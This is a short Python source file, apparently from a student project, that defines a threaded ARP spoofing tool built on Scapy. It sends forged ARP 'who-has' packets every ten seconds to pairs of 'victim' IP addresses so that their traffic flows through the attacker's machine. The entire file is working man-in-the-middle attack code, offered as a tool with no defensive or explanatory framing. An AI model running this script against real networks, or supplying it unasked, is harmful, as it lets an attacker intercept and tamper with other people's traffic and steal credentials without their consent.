# script for ARP spoofing
# written by Abdel K. Bokharouss and Adriaan Knapen
import threading
from time import sleep

from network_discoverer import NetworkDiscoverer
from scapy.all import *
from scapy.layers.l2 import ARP, Ether


class ArpSpoof(threading.Thread):
    keep_alive = True

    def __init__(self, iface=scapy.config.conf.iface):
        self.iface = iface
        self.own_mac_address = NetworkDiscoverer().get_own_mac_address(iface)
        self._victims = set()
        threading.Thread.__init__(self)

    def attach(self, ip):
        """
        Adds another ip which should be spoofed.
        :param ip:
        :return:
        """
        self._victims.add(ip)

    def detach(self, ip):
        """
        Removes an ip from the list of ips which should be spoofed.
        :param ip:
        :return:
        """
        self._victims.remove(ip)

    def _spoof_arp(self):
        packets = []

        # For each combination between two distinct victims, poison their cache to pass their traffic through us.
        for v1 in self._victims:
            for v2 in self._victims:
                if v1 is not v2:
                    packets.append(Ether() / ARP(op=ARP.who_has, hwsrc=self.own_mac_address, psrc=v1, pdst=v2))

        if packets:
            sendp(packets)

    def run(self):
        while self.keep_alive:
            self._spoof_arp()
            sleep(10)
